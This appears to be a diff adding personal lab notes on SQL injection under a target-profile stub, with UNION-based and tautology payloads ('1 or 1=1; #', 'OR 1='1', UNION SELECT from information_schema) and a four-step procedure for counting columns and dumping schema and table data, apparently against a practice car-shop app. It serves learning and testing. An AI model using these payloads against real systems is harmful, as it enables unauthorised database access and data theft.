@@ -30,3 +30,53 @@ Last Known HTTP Port: 80
 PSP: Unknown
 Malware: Unknown
 Action: Conduct approved SQLi Exploitation techniques to collect intelligence.
+
+
+
+Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+
+Though they may allow for nesting a statement within an existing one:
+
+php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+
+Ignore the rest
+Using # or -- tells the Database to ignore everything after
+
+
+
+Server-Side Query:
+
+SELECT product FROM item WHERE id = $select limit 1;
+
+
+
+Input to Inject:
+
+1 or 1=1; #
+
+Server-Side Query becomes:
+
+SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+
+Audi 'Union select 1,2,3,4,5 #'
+
+'OR 1='1
+
+
+1. Find vulnerable input & 'OR 1='1
+Selection=3 or 1=1
+
+2. Numbers of columns with numbers
+Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables #
+Selection=3 UNION SELECT 1,2,3 #
+
+3. Golden statement
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+
+4. Audi' UNION SELECT tireid,2,size,cost,5
+
+Selection=2 UNION SELECT null,name,color FROM car
+
+
